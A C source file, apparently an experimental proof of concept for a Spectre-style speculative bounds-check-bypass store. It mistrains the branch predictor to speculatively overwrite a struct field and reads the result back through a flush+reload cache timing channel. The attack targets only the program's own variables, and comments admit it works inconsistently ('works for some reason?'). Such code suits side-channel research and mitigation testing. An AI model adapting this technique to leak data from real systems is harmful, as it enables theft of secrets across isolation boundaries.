#include <stdio.h>
#include <stdlib.h>

#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define N_PAGES 256
#define REPETITIONS 1
#define CACHE_HIT 100
#define MAYBE_CACHE_HIT 175
#define BUF_SIZE 13
#define SECRET_SIZE 1
#define N_TRAINING 10

/*
 * Variables required in Cache
 *  user_idx
 *  buf
 *  user_char_copy
 *  user_passwd
 *  secret
 *  super_secret
 *
 * Variables requried in mem:
 *  buf_size
 */

typedef struct cache_vars {
    char user_idx;
    char user_char;
    char user_passwd;
    char super_secret;
    char secret;                                                    //OPTION 1: works for some reason?
    char buf[BUF_SIZE];
    //char secret;                                                  //OPTION 2: should work but does not

} cache_vars_t;

int overwrite_index = 255;//511;//1023;//2047;//4095;//-1;          //OPTION 1: works for some reason?
//int overwrite_index = BUF_SIZE;                                   //OPTION 2: should work but does not

int          buf_size __attribute__ ((aligned (256))) = BUF_SIZE;
cache_vars_t cache    __attribute__ ((aligned (256)));

void check_passwd(int user_idx, char user_char, char user_passwd, cp_t* flush_reload_arr, char super_secret) {

    cache.user_idx = user_idx;
    cache.user_char = user_char;
    cache.user_passwd = user_passwd;
    cache.secret = 'x';
    cache.super_secret = super_secret;//97;
    buf_size = BUF_SIZE;

    cpuid();
    flush((void*)&buf_size);
    cpuid();

    //bounds check should prevent overwrite. But speculatively executes
    if (cache.user_idx < buf_size) {
        cache.buf[cache.user_idx] = cache.user_char;
        //volatile cp_t cp0 = flush_reload_arr[0];
    }

    //volatile cp_t cp1 = flush_reload_arr[1];

    //secret has been (speculatively) overwritten with user char.
    if (cache.user_passwd == cache.secret) {
        //volatile cp_t cp2 = flush_reload_arr[2];
        volatile cp_t cp = flush_reload_arr[cache.secret];
        //volatile cp_t cp = flush_reload_arr[cache.super_secret];
        //printf("super secret: '%c' (%d)\n", cp.id, cp.id);
    }

}

int* overwrite(int index) {

    cp_t* flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr((void*)flush_reload_arr, N_PAGES);

    //access decisions in array, repeated out-of-bounds not traceable for branch predictor
    int n_accesses =   N_TRAINING + 1;
    int user_ids      [n_accesses];
    char user_chars   [n_accesses];
    char user_pwds    [n_accesses];
    char user_s_secret[n_accesses];

    for(int i = 0; i < n_accesses; i++) {
        user_ids[i]             = i % BUF_SIZE;
        user_pwds[i]            = 'x';
        user_chars[i]           = 'a' + (i%26);
        user_s_secret[i]        = 'b';
    }

    //set up parameters for attack function call.
    user_ids     [N_TRAINING]   = overwrite_index;
    user_pwds    [N_TRAINING]   = 's';
    user_chars   [N_TRAINING]   = 's';
    user_s_secret[N_TRAINING]   = 'c';
    cpuid();

    //Misstrain branch predictor, last iteration is out-of-bounds attack function call
    for(int i = 0; i < n_accesses; i++) {
        check_passwd(user_ids[i], user_chars[i], user_pwds[i], flush_reload_arr, user_s_secret[i]);
        cpuid();

        //When function call was in training phase (so user_pwds[i]=='x'), flush all cache traces.
        //This means all cache hits will be from attack function call.
        if(user_pwds[i] != 's') {
            asm volatile ("cpuid\n":::);
            flush_arr(flush_reload_arr, N_PAGES);
        }
        cpuid();
    }

    //make sure previous loop finishes execution
    cpuid();

    //time loading duration per array index
    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
    unmap_cache_pages(flush_reload_arr, N_PAGES);
    return results;
}

//Prints cache struct for debug reasons only
void cache_print(cache_vars_t* cache, int size) {
    unsigned char* cache_arr = (unsigned char*)cache;
    printf("\nsizeof cache_struct = %d\n", size);
    for(int i = 0; i < size + 4; i++) {
        printf("0x%02x\t", cache_arr[i]);
        if(i!=0 && i%4==3) printf("\n");
    }
    printf("\n");
}

int main(int argc, char** argv) {
    printf("secret p = %p\tbuf = %p\tbuf[last] = %p\toverwr = %p\n",
           &cache.secret, &cache.buf, &cache.buf[BUF_SIZE-1], &cache.buf[overwrite_index]);

    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints

    for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < SECRET_SIZE; s++) {
            results[r][s] = overwrite(s);
            __sync_synchronize();
        }
    }

    print_results(results, REPETITIONS, SECRET_SIZE, N_PAGES, CACHE_HIT);

    free_results(results, REPETITIONS, SECRET_SIZE);


    //Prints cache struct for debug reasons only
    for(int i = 0; i < BUF_SIZE; i++) cache.buf[i] = i;
    cache.secret = 0xf1;
    cache.super_secret = 0xf2;
    cache.user_idx = 0xaa;
    cache.user_passwd = 0xbb;
    cache.user_char = 0xcc;
    cache_print(&cache, sizeof(cache_vars_t));
    cache.buf[overwrite_index] = 0xdd;
    cache_print(&cache, sizeof(cache_vars_t));

}